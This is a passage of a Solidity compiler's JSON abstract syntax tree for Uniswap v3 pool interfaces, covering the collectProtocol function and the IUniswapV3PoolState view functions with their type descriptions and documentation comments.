												"typeName": {
													"id": 1981,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "484:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "463:40:7"
									},
									"returnParameters": {
										"id": 1984,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "512:0:7"
									},
									"scope": 2000,
									"src": "440:73:7",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1986,
										"nodeType": "StructuredDocumentation",
										"src": "519:483:7",
										"text": "@notice Collect the protocol fee accrued to the pool\n @param recipient The address to which collected protocol fees should be sent\n @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1\n @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0\n @return amount0 The protocol fee collected in token0\n @return amount1 The protocol fee collected in token1"
									},
									"functionSelector": "85b66729",
									"id": 1999,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "collectProtocol",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1993,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1988,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1999,
												"src": "1041:17:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1987,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1041:7:7",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1990,
												"mutability": "mutable",
												"name": "amount0Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1999,
												"src": "1068:24:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1989,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1068:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1992,
												"mutability": "mutable",
												"name": "amount1Requested",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1999,
												"src": "1102:24:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1991,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1102:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1031:101:7"
									},
									"returnParameters": {
										"id": 1998,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1995,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1999,
												"src": "1151:15:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1994,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1151:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1997,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1999,
												"src": "1168:15:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1996,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1168:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1150:34:7"
									},
									"scope": 2000,
									"src": "1007:178:7",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 2001,
							"src": "187:1000:7"
						}
					],
					"src": "45:1143:7"
				},
				"id": 7
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolState": [
							2108
						]
					},
					"id": 2109,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2002,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:8"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 2003,
								"nodeType": "StructuredDocumentation",
								"src": "71:169:8",
								"text": "@title Pool state that can change\n @notice These methods compose the pool's state, and can change with any frequency including multiple times\n per transaction"
							},
							"fullyImplemented": false,
							"id": 2108,
							"linearizedBaseContracts": [
								2108
							],
							"name": "IUniswapV3PoolState",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 2004,
										"nodeType": "StructuredDocumentation",
										"src": "276:1140:8",
										"text": "@notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas\n when accessed externally.\n @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value\n tick The current tick of the pool, i.e. according to the last tick transition that was run.\n This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick\n boundary.\n observationIndex The index of the last oracle observation that was written,\n observationCardinality The current maximum number of observations stored in the pool,\n observationCardinalityNext The next maximum number of observations, to be updated when the observation.\n feeProtocol The protocol fee for both tokens of the pool.\n Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0\n is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.\n unlocked Whether the pool is currently locked to reentrancy"
									},
									"functionSelector": "3850c7bd",
									"id": 2021,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "slot0",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2005,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1435:2:8"
									},
									"returnParameters": {
										"id": 2020,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2007,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1498:20:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 2006,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "1498:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2009,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1532:10:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 2008,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1532:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2011,
												"mutability": "mutable",
												"name": "observationIndex",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1556:23:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 2010,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1556:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2013,
												"mutability": "mutable",
												"name": "observationCardinality",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1593:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 2012,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1593:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2015,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1636:33:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 2014,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "1636:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2017,
												"mutability": "mutable",
												"name": "feeProtocol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1683:17:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 2016,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "1683:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2019,
												"mutability": "mutable",
												"name": "unlocked",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2021,
												"src": "1714:13:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2018,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1714:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1484:253:8"
									},
									"scope": 2108,
									"src": "1421:317:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2022,
										"nodeType": "StructuredDocumentation",
										"src": "1744:168:8",
										"text": "@notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "f3058399",
									"id": 2027,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal0X128",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2023,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1946:2:8"
									},
									"returnParameters": {
										"id": 2026,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2025,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2027,
												"src": "1972:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2024,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1972:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1971:9:8"
									},
									"scope": 2108,
									"src": "1917:64:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2028,
										"nodeType": "StructuredDocumentation",
										"src": "1987:168:8",
										"text": "@notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\n @dev This value can overflow the uint256"
									},
									"functionSelector": "46141319",
									"id": 2033,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeGrowthGlobal1X128",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2029,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2189:2:8"
									},
									"returnParameters": {
										"id": 2032,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2031,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2033,
												"src": "2215:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2030,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2215:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2214:9:8"
									},
									"scope": 2108,
									"src": "2160:64:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2034,
										"nodeType": "StructuredDocumentation",
										"src": "2230:147:8",
										"text": "@notice The amounts of token0 and token1 that are owed to the protocol\n @dev Protocol fees will never exceed uint128 max in either token"
									},
									"functionSelector": "1ad8b03b",
									"id": 2041,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "protocolFees",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2035,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2403:2:8"
									},
									"returnParameters": {
										"id": 2040,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2037,
												"mutability": "mutable",
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2041,
												"src": "2429:14:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2036,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2429:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2039,
												"mutability": "mutable",
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2041,
												"src": "2445:14:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2038,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2445:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2428:32:8"
									},
									"scope": 2108,
									"src": "2382:79:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2042,
										"nodeType": "StructuredDocumentation",
										"src": "2467:150:8",
										"text": "@notice The currently in range liquidity available to the pool\n @dev This value has no relationship to the total liquidity across all ticks"
									},
									"functionSelector": "1a686502",
									"id": 2047,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "liquidity",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2043,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2640:2:8"
									},
									"returnParameters": {
										"id": 2046,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2045,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2047,
												"src": "2666:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2044,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2666:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2665:9:8"
									},
									"scope": 2108,
									"src": "2622:53:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2048,
										"nodeType": "StructuredDocumentation",
										"src": "2681:1244:8",
										"text": "@notice Look up information about a specific tick in the pool\n @param tick The tick to look up\n @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or\n tick upper,\n liquidityNet how much liquidity changes when the pool price crosses the tick,\n feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,\n feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,\n tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick\n secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,\n secondsOutside the seconds spent on the other side of the tick from the current tick,\n initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.\n Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.\n In addition, these values are only relative and must be used only in comparison to previous snapshots for\n a specific position."
									},
									"functionSelector": "f30dba93",
									"id": 2069,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "ticks",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2051,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2050,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "3945:10:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 2049,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3945:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3944:12:8"
									},
									"returnParameters": {
										"id": 2068,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2053,
												"mutability": "mutable",
												"name": "liquidityGross",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4017:22:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2052,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "4017:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2055,
												"mutability": "mutable",
												"name": "liquidityNet",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4053:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 2054,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "4053:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2057,
												"mutability": "mutable",
												"name": "feeGrowthOutside0X128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4086:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2056,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4086:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2059,
												"mutability": "mutable",
												"name": "feeGrowthOutside1X128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4129:29:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2058,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4129:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2061,
												"mutability": "mutable",
												"name": "tickCumulativeOutside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4172:27:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 2060,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "4172:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2063,
												"mutability": "mutable",
												"name": "secondsPerLiquidityOutsideX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4213:38:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 2062,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4213:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2065,
												"mutability": "mutable",
												"name": "secondsOutside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4265:21:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 2064,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "4265:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2067,
												"mutability": "mutable",
												"name": "initialized",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2069,
												"src": "4300:16:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 2066,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4300:4:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4003:323:8"
									},
									"scope": 2108,
									"src": "3930:397:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2070,
										"nodeType": "StructuredDocumentation",
										"src": "4333:99:8",
										"text": "@notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
									},
									"functionSelector": "5339c296",
									"id": 2077,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "tickBitmap",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2073,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2072,
												"mutability": "mutable",
												"name": "wordPosition",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2077,
												"src": "4457:18:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int16",
													"typeString": "int16"
												},
												"typeName": {
													"id": 2071,
													"name": "int16",
													"nodeType": "ElementaryTypeName",
													"src": "4457:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int16",
														"typeString": "int16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4456:20:8"
									},
									"returnParameters": {
										"id": 2076,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2075,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2077,
												"src": "4500:7:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2074,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4500:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4499:9:8"
									},
									"scope": 2108,
									"src": "4437:72:8",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 2078,
										"nodeType": "StructuredDocumentation",
										"src": "4515:700:8",
										"text": "@notice Returns the information about a position by the position's key\n @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\n @return _liquidity The amount of liquidity in the position,\n Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,\n Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,\n Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,\n Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke"
									},
									"functionSelector": "514ea4bf",
									"id": 2093,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "positions",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 2081,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2080,
												"mutability": "mutable",
												"name": "key",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2093,
												"src": "5239:11:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												},
												"typeName": {
													"id": 2079,
													"name": "bytes32",
													"nodeType": "ElementaryTypeName",
													"src": "5239:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5238:13:8"
									},
									"returnParameters": {
										"id": 2092,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2083,
												"mutability": "mutable",
												"name": "_liquidity",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2093,
												"src": "5312:18:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2082,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5312:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2085,
												"mutability": "mutable",
												"name": "feeGrowthInside0LastX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2093,
												"src": "5344:32:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2084,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5344:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2087,
												"mutability": "mutable",
												"name": "feeGrowthInside1LastX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2093,
												"src": "5390:32:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2086,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5390:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2089,
												"mutability": "mutable",
												"name": "tokensOwed0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2093,
												"src": "5436:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2088,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5436:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2091,
												"mutability": "mutable",
												"name": "tokensOwed1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 2093,
												"src": "5469:19:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 2090,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5469:7:8",
													"typeDescriptions": {
